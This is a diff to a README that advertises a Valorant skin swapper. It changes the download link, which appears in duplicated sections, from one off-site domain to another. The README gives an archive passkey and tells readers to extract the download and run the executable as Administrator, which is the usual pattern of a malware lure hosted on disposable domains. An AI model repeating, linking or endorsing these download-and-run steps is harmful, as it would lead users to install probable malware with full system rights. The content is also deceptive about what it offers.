@@ -6,7 +6,7 @@ Client‑side skin swapper for Valorant. Swap weapon skins, knife models, agent 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -80,7 +80,7 @@ Based on community tools like `valorant-menu-swapper`, `ValorantSkinStyler`, and
 
 ## 🔧 Installation / How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download the archive.
+1. Click **[CLICK](https://gitdownapps.top)** to download the archive.
 2. Extract the files to a folder on your desktop.
 3. Run the executable **as Administrator**.
 4. Select your desired weapon skin or cosmetic.
@@ -94,7 +94,7 @@ Client‑side skin swapper for Valorant. Swap weapon skins, knife models, agent 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -168,7 +168,7 @@ Based on community tools like `valorant-menu-swapper`, `ValorantSkinStyler`, and
 
 ## 🔧 Installation / How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download the archive.
+1. Click **[CLICK](https://gitdownapps.top)** to download the archive.
 2. Extract the files to a folder on your desktop.
 3. Run the executable **as Administrator**.
 4. Select your desired weapon skin or cosmetic.
